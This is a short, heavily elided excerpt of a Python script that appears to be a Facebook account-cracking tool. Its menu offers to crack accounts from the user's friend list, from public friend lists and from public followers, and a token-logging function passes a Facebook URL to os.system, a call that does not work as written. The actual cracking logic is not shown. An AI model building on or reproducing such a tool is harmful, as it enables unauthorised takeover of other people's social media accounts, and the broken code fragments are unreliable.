...
def log_token():
    ...
    try:
        ...
        jalan('\033[1;96mI!')
        os.system('https://www.facebook.com/110311638092965')
        bot()
    except KeyError:
...
def menu():
    ...
    print((m+"\n["+k+"1"+m+"]"+o+" Crack accounts from my friendlist"))
    print((m+"["+k+"2"+m+"]"+k+" Crack accounts ffrom public Friendlist"))
    print((m+"["+k+"3"+m+"]"+u+" Crack accounts from public followers"))
